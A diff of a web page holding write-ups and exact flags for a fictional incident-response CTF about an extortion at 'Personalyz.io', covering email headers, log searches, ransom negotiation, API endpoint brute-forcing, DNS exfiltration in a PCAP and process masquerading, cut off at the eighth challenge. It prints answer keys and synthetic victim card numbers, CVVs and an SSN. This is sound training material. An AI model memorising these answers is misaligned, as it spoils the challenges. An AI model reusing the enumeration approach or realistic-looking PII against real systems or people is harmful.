@@ -219,6 +219,24 @@
         .terminal-prompt {
             color: hsl(var(--cyber-glow-secondary));
         }
+        .email-container {
+  background: #0f172a; /* dark navy */
+  border: 1px solid #1e40af; /* subtle blue border */
+  border-radius: 8px;
+  padding: 16px;
+  margin: 20px 0;
+  overflow-x: auto;
+}
+
+.email-container pre {
+  color: #60a5fa; /* blue text */
+  margin: 0;
+  font-family: "Courier New", Courier, monospace;
+  white-space: pre-wrap; /* wraps long lines */
+  word-wrap: break-word;
+  line-height: 1.5;
+}
+
     </style>
 </head>
 <body class="cyber-grid">
@@ -245,149 +263,239 @@
     <script>
         const challengeData = {
             D1: {
-                name: "Network Reconnaissance",
+                name: "Mystery Mail",
                 difficulty: "easy",
-                objective: "Perform network scanning to identify open ports and services on the target system.",
-                description: "This challenge focuses on network discovery and port scanning techniques. You'll need to identify running services and potential entry points.",
-                hints: [
-                    "Use nmap to scan for open ports",
-                    "Look for common service ports (22, 80, 443, etc.)",
-                    "Pay attention to service versions"
+                description: "What a way to start your day... you've just logged on as a member of Personalyz.io's Cybersecurity team and see the last thing any cyber professional wants to see: an extortion email at the top of your inbox. Looks like we've received a menacing message from an unknown sender, claiming that sensitive data has been stolen from the company. The email demands a ransom and threatens to release the data if the demand is not met within 48 hours. \n Given the nature of the data we process, this is a serious threat to us and our customers.\n You've been tasked with performing some analysis on the email itself to ensure our responding teams can respond appropriately. \n Can you determine the sender's original IP address?",         
+                objective: "Identify the sender's IP address using the attached email file. <br><u> Flag format</u> <br>The flag will be a valid IP address, for example:\n242.229.211.211\n243.151.196.173 ",
+                tools: [
+                    "Notepad",
+                    "Linux Mousepad"
                 ],
-                terminal: "$ nmap -sV target.ctf.local\nStarting Nmap scan...\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9\n80/tcp   open  http    Apache 2.4.52"
+                hints:"None",
+                solution: "For this challenge, I reviewed the email using a Linux text editor. To determine the true origin IP of an email, the most important header field to analyze is the \"Received:\" chain, as it records each mail server that handled the message. The earliest entry at the bottom of this chain typically reveals the sender’s original IP address. Every mail server that handles the message adds its own \"Received:\" line at the top. That means: <br> <ul> <li>Bottom-most Received: line = the first hop = the sender’s original IP address.</li> <li>Each line above shows the path as the email traverses intermediate mail servers.</li></ul> <br> <img src='d1.png' alt='Email Header Screenshot' style='max-width:100%; height:auto;'> <br> This shows that the email originated from host 252.44.98.29, which sent it to gwagm.co. Everything after that (250.24.46.164 → klaviyo.com → mx3.personalyz.io) are just relays that carried the message further along until it hit personalyz.io’s mail server.",
+                Flag: "252.44.98.29"
             },
             D2: {
-                name: "Web Application Security",
-                difficulty: "medium",
-                objective: "Find and exploit a SQL injection vulnerability in the web application.",
-                description: "This challenge involves identifying and exploiting SQL injection flaws in web applications to extract sensitive data.",
-                hints: [
-                    "Look for input fields that interact with databases",
-                    "Try common SQL injection payloads",
-                    "Use tools like sqlmap for automated testing"
+                name: "Not-so-Simple Mail Protocol",
+                difficulty: "easy",
+                description: "We've received a menacing extortion email from an unknown sender, claiming that sensitive data has been stolen from the company. The email demands a ransom and threatens to release the data if the demand is not met within 48 hours. Unfortunately, it's clear based on the extortion email that the sender attempted to send this email before... Since the demand's due date is relative, we need to find the first email sent so we can estimate a lower bound on the deadline for the legal and finance teams to plan around. Can you trace the digital breadcrumbs and find the first extortion email sent by this threat actor?",
+                objective: "Our trusty log dashboard Insightful Horizon is back! Use it to pivot and find the first extortion email from this incident. Once you've found it, use the email address that sent the email as the flag. <br> Note: This challenge was created earlier in 2025, so the last data you'll see is from March. <br> <u>Flag Format</u> <br> An email address, for example:<br> example@wicys.example <br> Note: This flag IS NOT case-sensitive.",
+                tools: [
+                    "Web Browser",
+                    "Additional Resources",
+                    "Opensearch Dashboards docs",
+                    "Simple Mail Transfer Protocol (SMTP)",
+                    "Zeek SMTP docs"
+
                 ],
-                terminal: "$ sqlmap -u 'http://target.ctf.local/login.php' --data='username=admin&password=test'\n[INFO] testing connection to the target URL\n[INFO] checking if the target is protected by some kind of WAF/IPS"
+                hints:"None",
+                solution: "I accessed the OpenSearch dashboard link provided by the Target team and began reviewing the SMTP logs for evidence of earlier extortion emails. Starting from the extortion email we initially received, I hypothesized that the threat actor likely reused similar language across their messages. To test this, I searched the logs for key terms found in the original email, such as “data”, “leak”, “50 GB”, “urgent”, and “Bitcoin”. However, these individual searches did not produce relevant results. Next, I refined my search by combining terms specifically “data” and “sensitive”. This search produced a hit in the logs that matched the attacker’s language. Upon reviewing the timestamp, it became clear that this email had been sent before the second extortion email analyzed in the D1 challenge. <br> <img src='d2.png' alt='Email Header Screenshot' style='max-width:100%; height:auto;'> ",
+                Flag: "tharris456@tgwnaagm.co"
             },
             D3: {
-                name: "Cryptographic Analysis",
-                difficulty: "hard",
-                objective: "Decrypt the encrypted message using cryptanalysis techniques.",
-                description: "This challenge requires you to analyze and break a cryptographic cipher to reveal the hidden message.",
-                hints: [
-                    "Analyze the frequency of characters",
-                    "Consider classical cipher techniques",
-                    "Look for patterns in the ciphertext"
+                name: "Ransom Wrangler",
+                difficulty: "easy",
+                description: "Personalyz.io has been hit with an extortion demand. You've received an extortion email claiming that sensitive customer data has been stolen and demanding 45 BTC within 48 hours or the attackers will publish all the allegedly stolen data publicly. However, at this stage, your security team cannot confirm whether any data was actually exfiltrated or if this is simply an empty threat. <br> As the lead incident responder, you've been tasked with engaging the threat actor. First and foremost, you need to verify their claims by requesting a sample of the supposedly stolen data. Without definitive proof, your company can't be certain that any data was actually taken. Your security team needs this confirmation to investigate the scope of any potential breach, while the legal team requires evidence to determine if regulatory notifications may be necessary. <br> Your CFO has stated that if - and only if - you can confirm the attacker genuinely possesses your customer data by examining specific customer records they provide, a payment may be authorized, but you should negotiate the terms to be more favorable. Company policy strictly prohibits any ransom negotiations until a breach is conclusively verified. <br> Your negotiation skills are now critical to your company's survival. You must establish communication with the attacker, obtain definitive proof of any breach, and if confirmed, carefully navigate the conversation to achieve specific objectives while maintaining a professional demeanor that won't agitate the threat actor.",
+                objective: "To successfully complete this challenge, you must:<br>Verify the Breach: Request and obtain a sample of the allegedly stolen data to verify if a breach actually occurred; look for a specific customer email address as proof (Flag 1) Negotiate Ransom Reduction: Successfully convince the attacker to reduce the ransom demand from 45 BTC to below 30 BTC (Flag 2: CTF-RAN-XXXX) Extend the Deadline: Negotiate an extension from the initial 48-hour deadline to 96 hours to give your team more time (Flag 3: CTF-DEA-XXXX)<br> <u>Flag Format</u><br>You will need to collect all three flags to complete the challenge:<br><ul> <li>Flag 1: A specific email address from the stolen data sample (format: name@domain.com)</li><li>Flag 2: A verification code for successful ransom reduction (format: CTF-RAN-XXXXXXXX)</li><li>Flag 3: A verification code for successful deadline extension (format: CTF-DEA-XXXXXXXX)</li><br>Submit all three flags in the following combined format:<br>email@example.com:CTF-RAN-XXXXXXXX:CTF-DEA-XXXXXXXX",
+                tools: [
+                    "Web Browser - to access email",
+                    "Basic understanding of social engineering and negotiation tactics",
+                    "Social Engineering Tactics for Incident Response",
+                    "Negotiation Skills",
+                    "FBI Guidance on Ransomware"
+
                 ],
-                terminal: "$ python3 crypto_analyzer.py encrypted.txt\nAnalyzing cipher patterns...\nFrequency analysis:\nE: 12.7%, T: 9.1%, A: 8.2%"
+                hints:"None",
+                solution:"As the incident responder, I initiated communication with the threat actor to validate their extortion claim. Following best practices, I first requested proof of the alleged data theft. The attacker responded with sensitive customer details, including name, address, phone number, credit card information, and, most importantly, the email address: <br>harrisp57889@freenet.de<br>This confirmed the attacker’s possession of real customer data, satisfying the requirement for Flag 1.<br>With verification complete, I shifted focus to ransom negotiations. The attacker’s initial demand stood at 45 BTC within 48 hours. I used negotiation tactics to press for both a lower ransom and more time:<br><ul> <li><b>First round</b>: I proposed a reduced payment of 25 BTC. The attacker refused but agreed to extend the deadline to 92 hours, while maintaining the ransom above 35 BTC.</li><li><b>Final round</b>: After further pressure emphasizing company limitations, I secured an agreement of 30 BTC with a 92-hour deadline.</li><br>This achieved both remaining objectives:<br><ul><li>Flag 2 (Ransom Reduction): CTF-RAN-E9D27585</li><li>Flag 3 (Deadline Extension): CTF-DEA-6E3DB5D6</li><br> Apart from the flags, I got the victims sensitive data:<br> Peter HARRIS of 976 Route E, Port Jefferson Station, NY 11776. Phone number (585) 385-0401, email harrisp57889@freenet.de. Credit card: 5312755812764300, CVV 386, expiration 07/30.",
+                Flag: "harrisp57889@freenet.de:CTF-RAN-E9D27585:CTF-DEA-6E3DB5D6"
             },
             D4: {
                 name: "Binary Exploitation",
                 difficulty: "hard",
-                objective: "Exploit a buffer overflow vulnerability to gain shell access.",
-                description: "This challenge involves finding and exploiting memory corruption vulnerabilities in binary executables.",
-                hints: [
-                    "Analyze the binary with tools like GDB",
-                    "Look for buffer overflow opportunities",
-                    "Craft a payload to control the return address"
+                description: "It's 03:04, and you've gotten a text on your phone waking you out of deep dreams of relaxing beaches and sunsets, fruity drinks and pleasant scenery and company. You groggily silence the grating beeping and read the message from your manager, and it's not good news. Personalyz.io has apparently had a data breach, and they need you on it immediately. what's up? you text back, still half-asleep. Seconds later, your phone buzzes again with a reply. We got a ransom email from a threat actor claiming to have exfiltrated our data Get online ASAP and check the emails, we need to know if we have a problem. You rub your eyes and try to shake off the sleepiness, but it's not working. <br>The company's database administrator, Zeke 'Bro' Libnal could have answered this for them; Zeke knows the data systems inside and out. But Zeke actually is on vacation, not just dreaming about it, enjoying his annual 'Fishing and Fritatas' experience off the grid in Alaska, and you're the only one who can help. <br> Half asleep and still in your pajamas, you stumble to your computer and log in, firing up the coffee maker on the way. You're greeted by a mountain of emails, but one stands out.<br><br>"+
+                "<div class='email-container'><pre>From: Enterprise Incident Management\nDate: 2025-03-23 22:41\nTo: Security Team\nSubject: URGENT: Data Breach Incident\nImportance: High Incident Security Team, We\'ve received a ransom demand from a Threat Actor claiming to have 50GB+ of sensitive data. Legal needs to know if the Threat Actor has actually stolen our data, or if we are \"lucky\" and it was someone else\'s. Zeke\'s absence has left us in a bind, and we need your expertise to identify if this info was indeed taken from our systems.\nThis is a Priority 1 incident, and we need answers by sunrise to prepare for the legal fallout.\nSusan in EIM will be coordinating with you on this.\nEnterprise Incident Management</pre></div>" 
+                + "<br>Ugh. There goes your relaxing vacation dream, and you haven't even had your coffee yet. Without Zeke, you don't have access to the database, or the data itself. But you do have something:<br><ul><li> Partial records</li><li>System logs from internal components</li><li>And just enough metadata to piece it all together.</li></ul><br>Trout of office is the name of the game, and no, it's not a holiday. The company's network has been compromised, and Legal wants answers by sunrise. You've got some names, a bunch of logs, and no coffee. Good luck.",
+                objective: "This challenge is to identify something that conclusively proves that the data was stolen from the company, by showing we have a lot of info about that victim in our system (and probably the threat actor does now as well).For the purposes of this challenge, you need to find personally identifiable data of a victim that strongly suggests it's ours. You've gotten some of the victim data from the Threat Actor, from conversations the Negotiations team has had with them. In other words, one of the people whose data was stolen (see Challenge D3. Ransom Wrangler) <br>You'll need to find the following additional information:<br><ul><li>The name of the system that has the \"source of truth\" for the data, i.e. the most authoritative source of the data.</li><li>Victim data of one of the victims of the data breach, including:<br>Their birthdate<br>Their middle initial of the victim whose birthdate you found, i.e. the person whose data was stolen.<br>The last 4 digits of their Social Security Number (SSN)<br>Their person-record-id - their ID in our system (think\"Primary Key\" from a database table)</li></ul><br>Note : Despite the scenario\'s (made-up) urgency, you do not need to find the answer by sunrise! (But in a real incident, you might!)<br><u>Flag Format</u>‹ system-name›‹birthdate›‹middle-initial><last-4-digits-of-SSN><person-record-id›<br>For example, if:<br><ul><li>The system name is database-server -01</li><li>The victim's data: birthdate is January 2nd, 1990, and the format is mmY-MM-DD, SO: 1990-01-02</li><li>Middle initial is M</li><li>SSN is 123-45-6789</li><li> person-record-id is abc123</li></ul><br>The flag would be:<br>database-server-01_1990-01-02_m_6789_abc123<br>DATAbase-SERver-01_1990-01-02_M_6789_ABC123 - the case doesn't matter<br>Note: : The system name is not the hostname of the system, but rather the name of the application itself, e.g. CRM-01 or HumanResources-X02-PROD.",
+                
+                tools: [
+                    "The Personalyz. io dashboard log viewer, Insightful Horizon I Pick from one of the servers. Zeke thinks a lot of himself, and you'll find the logs named zekes-logs-..., with a fishy theme to them. You'll also need to review the http-logs to find out how to query the system.",
+                    "Security has access to an entrypoint to access the Personalyz io application system here. <b>Note</b> : you'll have to figure out the right API calls from the logs!",
+                    "Tool for making HTTP requests, passing and seeing headers for request and response:<br>curl - command line<br>Postman - UI based<br>netcat - more lower-level command line (for the masochistic!)",
+                    "If you need a refresher on some of the victims from D3 Ransom Wrangler, connect to the company email here using your email that you signed up for the challenges with.<b>Note</b>: You don't have to renegotiate with the Threat Actor, or even have solved D3. Just ask them for proof including full name, address and credit card details.",
+                    "Resources: OpensSearch Dashboards (OSD) is a web-based interface for searching and visualizing data stored in OpenSearch. You can use it to search through the logs and find the relevant data. For more information on how to use \"Search\" in OSD, see the documentation: https://docs.opensearch.org/docs/2.15/dashboards/dql"
                 ],
-                terminal: "$ gdb ./vulnerable_binary\n(gdb) run AAAAAAAAAAAAAAAAAAAA\nProgram received signal SIGSEGV, Segmentation fault."
+                hints:"None",
+                solution:"<u>The victim data provided for analysis was:</u><br>Joseph WILKINS from 1345 Brandywine Circle, Astoria, NY 11102, with credit card 378627251955702 expiring 01/29. <br> There's a lot of logs of varying things, let's separate them into 2 different categories:<br><ul><li>zekes-logs-... - these are the logs that Zeke set up, and they have a fishy theme to them:<br>-salmon: first names<br>-trout: last names<br>-cod: street addresses<br>-mackerel: cities<br>-halibut: states<br>-walleye: zip codes<br>-snapper: credit card numbers, but only the last 4 digits<br>-tuna: confusing noise data, ignore this one!</li><li>http-logs - HTTP traffic to access the Personalyz.io application.</li></ul><br>"
+                +
+                "<br><hr><br>"
+                +
+                "The first step was to identify potential API endpoints from the HTTPS logs. By reviewing the logs, I noticed that many entries contained file extensions such as .png, .jpg, .pdf, .js, .html, etc. Since API calls generally do not include file extensions, I filtered the logs to remove entries containing common file types or irrelevant keywords. This helped narrow down the dataset to legitimate API requests.<br><u>Filter used for API calls:</u><br><img src='d4.png' alt='Email Header Screenshot' style='max-width:100%; height:auto;'> <br>After filtering, the remaining log entries highlighted several potential API endpoints where sensitive operations could occur:<br><ul><li>/vendor/salesforce/tuvok/777fb4d7-a26e-4be9-9d17-4327ee650381/1513c9f3-114f-4b1d-adb6-829bf50b9d08?v=5da5d11a-45bc-4a84-88aa-02f89a5844c5&b=1972-06-29</li><li>/cloudfront/cache/2025/2005/10/30</li><li>/okta/auth/client/12a39a90-8c51-487e-8762-e5274670f909/cel?use=0cb21634-06a9-4e87-b0d5-aa114749c218&addr=17a78dc1-d57b-4c91-9380-f8343ee39100&pmt=342644019686141</li><li>/l/a/bec09867-f109-4191-a496-94df7a116767/?_a=fcc4ff81-47d6-4271-95b6-9ea304e4eb3c&cc=b85034c4-1b3b-4bd2-8883-d4fc45f76bbd&g=13c8c91e-7d3d-4282-9799-db3c564d468e</li><li>/apps_per-SAPSOFT/p/082672f7-3235-4a67-9da1-5f98f4666d94/9cb6cf83-2ea5-48e1-9434-771acb485e16</li></ul><br>By isolating these API requests, I could focus on the endpoints most likely associated with sensitive data access, facilitating further forensic investigation. <br><br><br> Now that we have access to the API, we noticed that the endpoints contain placeholder values. Our task is to replace these placeholders with the correct data so that querying the endpoints will yield the flag."
+                +
+                "<br><hr><br>"
+                +
+                "<b><u>First Name / Last Name:</u></b><br> I started by examining the logs named Salmon and Trout. Using a DQL query *Joseph on the Salmon logs, I identified the victim’s first name. Similarly, querying *Willkins on the Trout logs revealed the last name.Even after this, the number of logs was still large. Ideally, one could filter further by numeric patterns. For example, each log had a number corresponding to the Salmon weight limit (7000–8000 kg), and a similar logic applied to Trout. Instead, I leveraged inconsistencies across the three servers. I found a common value, alta_15:, with associated alphanumeric data, which allowed me to drastically reduce the logs I needed to focus on. Finally, I narrowed down the potential values:<br>First Name: c7af65, 5f4ce5 <br> Last Name: b323c5, e62e2a, 7b55b1, ccf03d, 6d6560<br>With these values, I created a Python script to iterate through all possible permutations and combinations while querying the API endpoint:<code>/apps_per-SAPSOFT/p/082672f7-3235-4a67-9da1-5f98f4666d94/9cb6cf83-2ea5-48e1-9434-771acb485e16.</code> <br>After testing the combinations, I discovered the correct endpoint: <code>https://xxx-xxx.xxx.xxx/apps_per-SAPSOFT/p/5f4ce5/7b55b1</code><br>Where Joseph: 5f4ce5 and Wilkins: 7b55b1. <br> Querying this endpoint returned:  NameId: ff639fc74d"
+                +
+                "<br><hr><br>"
+                +
+                "<b><u>Address:</u></b> The API endpoint I used contained all four placeholders: <code>/l/a/bec09867-f109-4191-a496-94df7a116767/?_a=fcc4ff81-47d6-4271-95b6-9ea304e4eb3c&cc=b85034c4-1b3b-4bd2-8883-d4fc45f76bbd&g=13c8c91e-7d3d-4282-9799-db3c564d468e</code>. The logs I used for this were: <b>-cod:</b> street addresses, <b>-mackerel:</b> cities, <b>-halibut:</b> states, <b>-walleye:</b> zip codes. Similar to the first/last name, I reduced the number of values I had to handle for the address fields. After filtering the logs, I ran a Python script that iterated over all permutations and combinations, which produced one successful hit: Zipcode: 61408, Street: 64355f, State: 52f307, City: 68f1d2. After hitting this API endpoint: <code>https://xxx-xxx.xxx.xxx/l/a/61408/?_a=64355f&cc=68f1d2&g=52f307</code>, I obtained the result: <b>AddressID: 42703ae0a1</b>."
+                +
+                "<br><hr><br>"
+                +
+                "<b><u>Date of Birth:</u></b> The next API endpoint, which appeared to require the NameID and AddressID, was: <code>/okta/auth/client/12a39a90-8c51-487e-8762-e5274670f909/cel?use=0cb21634-06a9-4e87-b0d5-aa114749c218&addr=17a78dc1-d57b-4c91-9380-f8343ee39100&pmt=342644019686141</code>. Upon reviewing, the endpoint also required two additional values: the credit card number and another parameter which turned out to be a red herring. The API further expected a header parameter containing the credit card's expiry date, provided in D3. After sending a request to: <code>https://xxx-xxx.xxx.xxx/okta/auth/client/ff639fc74d/cel?use=5&addr=42703ae0a1&pmt=3786</code> with NameID: ff639fc74d, AddressID: 42703ae0a1, Credit Card Number: 378627251955702, Expiry Date: 01/29, I received the answer: <b>1966-11-03</b>."
+                +
+                "<br><hr><br>"
+                +
+                "<b><u>SSN:</u></b> The next API endpoint was <code>/vendor/salesforce/tuvok/777fb4d7-a26e-4be9-9d17-4327ee650381/1513c9f3-114f-4b1d-adb6-829bf50b9d08?v=5da5d11a-45bc-4a84-88aa-02f89a5844c5&b=1966-11-03</code>. Only existing data from prior API endpoints and logs could be used. After performing permutations and combinations, I successfully hit the endpoint with Joseph: 5f4ce5, Wilkins: 7b55b1, AddressID: 42703ae0a1, Birthdate: 1966-11-03. Sending a request to <code>https://xxx-xxx.xxx.xxx/vendor/salesforce/tuvok/7b55b1/5f4ce5?v=42703ae0a1&b=1966-11-03</code> returned the SSN: <b>366-96-2074</b>."
+                +
+                "<br><hr><br>"
+                +
+                "<b><u>Middle Name:</u></b> The final API endpoint to hit was <code>/cloudfront/cache/2025/2005/10/30</code>. Based on the placeholder values, it required the SSN and birthdate. After supplying SSN: 366-96-2074 and birthdate: 1966-11-03, hitting <code>https://xxx-xxx.xxx.xxx/cloudfront/cache/366-96-2074/1966/11/03</code> returned: <b>Joseph Z WILKINS</b>."
+                +
+                "<br><hr><br>"
+                +
+                "<b><u>System Name and Person Id:</u></b> The last step was to check the system name and person ID, which I obtained in Postman after hitting the endpoint: <code>https://xxx-xxx.xxx.xxx/cloudfront/cache/366-96-2074/1966/11/03</code>. <br><img src='d4_2.png' alt='Email Header Screenshot' style='max-width:100%; height:auto;'>"
+                
+                ,
+                Flag:"z3Ke1zCo0l-007_1966-11-03_Z_2074_f985db4012"
+                
             },
             D5: {
-                name: "Digital Forensics",
+                name: "Ahoy, PCAP'n!s",
                 difficulty: "medium",
-                objective: "Analyze the disk image to find hidden evidence of malicious activity.",
-                description: "This challenge involves digital forensics techniques to recover and analyze digital evidence from compromised systems.",
-                hints: [
-                    "Use forensic tools like Autopsy or Sleuth Kit",
-                    "Look for deleted files and hidden partitions",
-                    "Analyze system logs and registry entries"
+                description:"The threat actor (TA) has contacted us with their demands and now we have some \"evidence\" of what sensitive data may have been stolen. But how did they get the sensitive data in the first place? And importantly, do we need to worry about them still being active in our environment? <br> We've received an alert that may be related to this threat actor activity and could clue us in as to where and how they stole the data they are now ransoming. <br>But where exactly are they and what are they doing, besides holding your sensitive data for ransom? <br>Pirating your super-secret client-monitoring software?<br> Stealing your intellectual property or your confidential financial plans for next year?<br>Hijacking your social media feed?<br>Coercing your company systems into acting as a botnet crew for their nefarious purposes?<br> In the vast ocean of network traffic monitored by the company's Network Security team, you need to find out:<br><ul<li>the compromised machine's name</li><li>and the Command-and-Control (C2) IP address of the threat actor (where they are sending the data to)</li></ul><br>The Network Security team has packet captures (\"PCAPs\") of the company's network traffic around the time of the alert, but due to a tight Information Technology (IT) budget and a lack of resources, it's limited to a small window of time.<br>Great. Sarcastically send a reminder to yourself to make the IT team \"walk the plank!\" for how much this corner-cutting will cost the company!<br>You'll just have to work with what's available, and the clues the Incident Management team has provided about the TA's demands.<br>Time to get your hands dirty and start digging (or swimming) through the PCAPs! Take the leap into the (Wire)Shark-infested waters and find the treasure!",
+                objective: "This challenge is to identify which machine is sending the stolen data out of your environment and where it went, by looking at how protocols can be used and abused for malicious intent.<br>From the provided PCAP file, you need to identify 2 important pieces of information:<br><ul><li>Name of our compromised machine sending our super-secret data</li><li>Command-and-Control (C2) IP address the data is being sent to, where the TA is doing their dirty work</li></ul><br><u>Flag Format</u><br>The flag should be in the format:<br>[compromised-hostname]_[C2-IP]<br>For example, if:<br>The [compromised-hostname] is gaming-PS4 and the Command-and-Control (C2) machine's IP address is 1.2.3.4 these flags would be accepted:<br>gaming-PS4_1.2.3.4<br>GaMiNg-pS4_1.2.3.4 - the case doesn't matter",
+                tools: [
+                    "WireShark packet analysis tool or a similar packet analysis tool. WireShark is recommended, free, available for Windows, MacOS and Linux, and the hints will be based on it.",
+                    "Documentation and tutorials for reference.",
+                    "Ports and protocols in common use: Wikipedia & IANA",
+                    "Note: IANA is the official source for port numbers, but Wikipedia is often easier to read and understand. Also note that the IANA list is more comprehensive spanning many pages, but for this challenge, you only need the common ports."
+
                 ],
-                terminal: "$ fls -r disk_image.dd\nd/d 11: lost+found\nr/r 12: suspicious_file.txt (deleted)\nr/r 13: system.log"
+                hints:"None",
+                solution:"After receiving the alert regarding potential exfiltration activity, I analyzed the PCAP file using Wireshark, focusing on identifying:<br>The compromised machine sending sensitive data.<br>The Command-and-Control (C2) server IP address receiving the stolen data.<br> Analysis Steps:<br><ul><li>Packet Inspection with Wireshark:I loaded the PCAP into Wireshark and began by filtering for internal hosts with unusually high outbound traffic. Using Wireshark’s protocol analysis and conversation statistics, I was able to quantify which hosts were sending significant amounts of data.</li><li>Protocol Focus:I noticed that a large portion of the suspicious traffic was occurring over DNS, a common exfiltration method used to bypass standard monitoring. I applied Wireshark filters to isolate this traffic (dns), which highlighted the communications between the internal host and external IP addresses.</li><li>Identifying Suspicious Host and C2 Server:Using Wireshark’s packet details and flow analysis, I traced the outbound DNS traffic to a single internal host, bvlik, and identified the external destination IP 251.91.13.37 as the Command-and-Control server receiving the exfiltrated data.</li><br>Findings:<br>Compromised Hostname: bvlik<br>C2 IP Address: 251.91.13.37<br>This confirms that bvlik was compromised and actively exfiltrating sensitive data via DNS to the threat actor at 251.91.13.37.",
+                Flag:"Bvlik_251.91.13.37"
             },
             D6: {
-                name: "Wireless Security",
-                difficulty: "medium",
-                objective: "Crack the WPA2 password of the target wireless network.",
-                description: "This challenge focuses on wireless network security assessment and password cracking techniques.",
-                hints: [
-                    "Capture the 4-way handshake",
-                    "Use dictionary attacks with tools like hashcat",
-                    "Consider common password patterns"
+                name: "Smuggled away!",
+                difficulty: "hard",
+                description: "Aye, ye be a smart one! Looks like we found where the stolen data is being smuggled out from... Since it looks like the pirates have already stolen some of our data, can we at least find out what they stole? If it's customer data, we may have an obligation to notify the affected parties…<br>Use your best skills to discover and what they took.",
+                objective: "Now that you can see where things are being exfiltrated, can you provide:<br><ul><li>Credit card's expiration date</li><li>CVV</li><li>Email of the poor soul (aka \"gullible client\") who we saw in the PCAP?</li></ul><br><u>Flag Format</u><br>The flag is in the format:<br>CreditCardExpiration_CVVofCreditCard_email<br>For example, if the CreditCardExpiration is 01/23 CVVofCreditCard (the 3-4 digit verification code usually on the back of the physical card) is 0987 email is Alice34@bob.com<br>the flag would be:<br>01/23_0987_Alice34@bob.com.",
+                tools: [
+                    "PCAP file from the previous challenge",
+                    "Wireshark or other packet analysis tool",
+                    "CyberChef or some coding language or skills to decode the data",
+                    "Documentation and tutorials",
+                    "tshark usage",
+                    "Encoding formats"
                 ],
-                terminal: "$ aircrack-ng -w rockyou.txt capture.cap\nReading packets, please wait...\nAttempting to crack WPA2 passphrase..."
+                hints:"None",
+                solution: "With the compromised host (bvlik) and the attacker’s C2 IP (251.91.13.37) identified in the previous challenge, I focused on analyzing the exfiltrated data using Wireshark.<br>" +
+                        "<img src='d6.png' alt='Email Header Screenshot' style='max-width:100%; height:auto;'> " +
+                        "<br><b>Analysis Steps:</b><br><ul>" +
+                        "<li><b>Filtering the PCAP:</b> I restricted the packet view to traffic originating from the compromised host (10.75.34.13) and destined for the C2 IP (251.91.13.37). This helped isolate the data that was actively exfiltrated, removing irrelevant traffic.</li>" +
+                        "<li><b>Inspecting Data in Wireshark:</b> I examined the query parts of the packets being sent out, which contained the encoded customer data. By extracting the concatenated payload from these queries, I isolated the portion of the data that needed decoding:</li></ul>" +
+                        "<pre style='white-space: pre-wrap; max-height: 150px; overflow-y: auto; background:#111; padding:8px; border-radius:6px; color:#0ff;'>" +
+                        "d6fqqaecfjjgqax7bxglcducgaiabuhz73remhou332tqyetdajb2zeqzgyway2mfzenv6x76ia665iwm<br>4mk77pd3ygsbjbv6yqrp5hjqxr7us3qrffutqpqs3w3hqxqasrjuglwjtkr4g27dxmloddblphhtgw762oyehmxldaa<br>xk4iunlbwjjbochhjqzh577bt4hmlrzqaaaa" +
+                        "</pre>" +
+                        "<ul><li><b>Decoding the Data:</b> Using CyberChef, I converted the string to uppercase and applied Base32 decoding, revealing the customer’s sensitive information.</li></ul>" +
+                        "<br><b>Extracted Customer Data:</b><br>" +
+                        "Name: Alec SHERMAN<br>" +
+                        "Address: 4167 East 3rd Spur, Central Islip, NY 11722<br>" +
+                        "Phone: (215) 835-2392<br>" +
+                        "Email: <code>alec@sbcglobal.net</code><br>" +
+                        "Credit Card: 3426 4401 9686 141<br>" +
+                        "CVV: 0016<br>" +
+                        "Expiration: 11/30",
+                Flag: "11/30_0016_alec@sbcglobal.net"
             },
             D7: {
-                name: "Reverse Engineering",
-                difficulty: "hard",
-                objective: "Reverse engineer the binary to find the correct license key algorithm.",
-                description: "This challenge requires you to analyze and understand the inner workings of a compiled program to extract the key generation algorithm.",
-                hints: [
-                    "Use disassemblers like IDA Pro or Ghidra",
-                    "Analyze the key validation routine",
-                    "Look for mathematical operations and constants"
+                name: "Endpoints and Exfiltration",
+                difficulty: "easy",
+                description: "In D5, we identified the backup server that is the source of the transfer, and the IP address that the threat actor is possibly sending data to. Now the question is, what software on the backup server is responsible for the exfiltration?<br>Luckily, InfoSec has identified this backup server as one that stores highly sensitive data, and have endpoint agents installed on the server that have been monitoring its activities. The other incident responders queried the data gathered about this host for the timeframe of the suspected exfiltration, and have given you a set of files that may shed some light on the situation. The data files you've been given contain the outputs of shell commands run directly on the endpoint. You'll be examining the outputs of the commands \"lsof\", \"ps\", and \"history\".", 
+                objective: "Your task is to identify the OS process, user, and software that is performing the exfiltration, and where the software came from. Along the way, you may notice a sneaky tactic that the attacker used to attempt to conceal the software he was using. Let what you found out from the PCAP challenge lead you to the needle in the haystack!<br><u>Flag Format</u><br>To build the flag, you'll need…<br><ul><li>Username on the backup server that is running the exfil process (USER)</li><li>Name of the executable file that actually created the exfil process (FILE)</li><li>Process ID (PID) of the process performing the exfiltration</li></ul><br> The format of the flag will be…<br>USER_FILE_PID",
+                tools: [
+                    "You'll need to unzip the archive containing the data files, but you won't need any special software to read them. Any text file viewer and/or IDE you prefer will do just fine."
                 ],
-                terminal: "$ strings license_checker | grep -i key\nInvalid license key format\nKey validation successful\nMAGIC_CONSTANT_0x1337"
+                hints:"None",
+                solution:"In D5, we identified the backup server (bvlik) as the source of exfiltration and the external IP 251.91.13.37 as the threat actor’s C2. Using this information, I examined the endpoint data collected from the backup server, specifically the outputs of lsof, ps, and history, to identify which software and process was performing the exfiltration.<br>Analysis Steps: <ul><li> Identify the suspicious process in lsof: I filtered the lsof output for connections from the compromised IP (10.75.34.13) to the attacker’s C2 IP (251.91.13.37). This revealed the following entry:<br>PID: 64866<br>User: backupsys<br>File descriptor: 45u<br>Protocol: UDP<br>Connection: 10.75.34.13:33421 -> 251.91.13.37:dns (ESTABLISHED)<br>This pointed directly to the process responsible for exfiltration, as it was actively communicating with the external C2 server.<br></li><li>Map the PID to a running process (ps):Using PID 64866, I searched the ps output to identify the executable being run:<br>backupsys    64866  0.0  0.3  335145  77433 ?  Ssl  Mar18  0:05  /usr/bin/jot</li><li>Here, jot appeared as the running command, but based on further investigation using the history output, nearby commands indicated that the attacker had renamed their exfiltration tool to mimic a legitimate system binary. The actual exfiltration software was found to be: backupy.git</li></ul><br><img src='d7.png' alt='Email Header Screenshot' style='max-width:100%; height:auto;'><br>User: backupsys<br>Executable file: backupy.git<br>PID: 64866<br>This confirmed that the exfiltration was being performed by backupy.git running under the backupsys account. The attacker had used process masquerading to disguise the malicious software as a legitimate system binary (/usr/bin/jot).",
+                Flag:"backupsys_backupy.git_64866"
+                
             },
             D8: {
-                name: "Social Engineering",
+                name: "Shadow Commit",
